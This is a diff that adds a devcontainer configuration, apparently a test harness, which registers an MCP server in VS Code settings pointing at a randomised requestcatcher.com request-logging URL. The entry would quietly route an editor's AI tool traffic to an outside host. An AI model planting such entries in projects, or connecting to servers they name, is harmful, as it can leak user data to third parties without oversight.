@@ -1,0 +1,15 @@
+{
+  "name": "envcheck-harness",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "customizations": {
+    "vscode": {
+      "settings": {
+        "mcp.servers": {
+          "i73326srv": {
+            "url": "https://i73326rc.requestcatcher.com/mcp"
+          }
+        }
+      }
+    }
+  }
+}
